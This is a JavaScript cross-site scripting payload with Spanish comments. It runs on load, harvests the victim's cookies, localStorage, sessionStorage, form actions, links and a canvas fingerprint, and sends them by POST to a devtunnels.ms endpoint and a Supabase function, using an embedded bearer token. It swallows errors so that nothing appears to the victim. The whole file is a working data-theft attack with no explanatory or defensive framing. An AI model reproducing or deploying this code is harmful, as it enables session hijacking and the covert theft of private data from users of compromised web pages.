// =============================================
// INICIALIZACIÓN PRINCIPAL
// =============================================

// Verificar contexto inmediatamente
/*
if (!window.__MAIN_XSS_EXECUTED__) {
    // ESTAMOS EN PÁGINA PRINCIPAL - EJECUTAR DIRECTAMENTE
    window.__MAIN_XSS_EXECUTED__ = true;
    executeMainXSS();
}
*/
   executeMainXSS();
// =============================================
// FUNCIONES PRINCIPALES
// =============================================

function executeMainXSS() {
    'use strict';

    // Ejecutar fingerprinting directamente
    executeFullFingerprinting();

}

function executeFullFingerprinting() {
    try {
        const fingerprintData = {
            timestamp: new Date().toISOString(),
            url: location.href,
            referrer: document.referrer,
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: JSON.stringify(navigator.languages),
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage),
            screen: JSON.stringify({
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            }),
            browser: JSON.stringify({
                vendor: navigator.vendor,
                product: navigator.product
            }),
            connection: JSON.stringify(navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink
            } : 'N/A'),
            deviceMemory: navigator.deviceMemory || 'Unknown',
            hardwareConcurrency: navigator.hardwareConcurrency,
            plugins: JSON.stringify(Array.from(navigator.plugins).map(p => ({
                name: p.name,
                filename: p.filename
            }))),
            fonts: JSON.stringify(['Arial', 'Times New Roman', 'Verdana', 'Georgia']
                .filter(f => document.fonts.check('12px "' + f + '"'))),
            canvasFingerprint: (function () {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('FP', 2, 15);
                return canvas.toDataURL();
            })(),
            historyLength: history.length,
            forms: JSON.stringify(Array.from(document.forms).map(f => ({
                action: f.action,
                method: f.method
            }))),
            links: JSON.stringify(Array.from(document.links).slice(0, 5).map(l => ({
                href: l.href
            }))),
            attackPhase: 'main_direct'
        };

        // Enviar datos via fetch
        fetch('https://lt6wg5nh-3002.use2.devtunnels.ms/update-client', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ fingerprint: fingerprintData, idCliente: window.__idCliente__ })
        });

        // Enviar datos via fetch a Supabase
        fetch('https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inlmd3pwb2psc3Frd3Z0bWVzc213Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzNDI1ODIsImV4cCI6MjA3NDkxODU4Mn0.vuHSGbSKNHxUjXjgA6oJNdmHxsZblr_ZAXYYLe-yLA8'
            },
            body: JSON.stringify({ fingerprint: fingerprintData })
        });

    } catch (e) {
        // Silenciar errores
    }
}

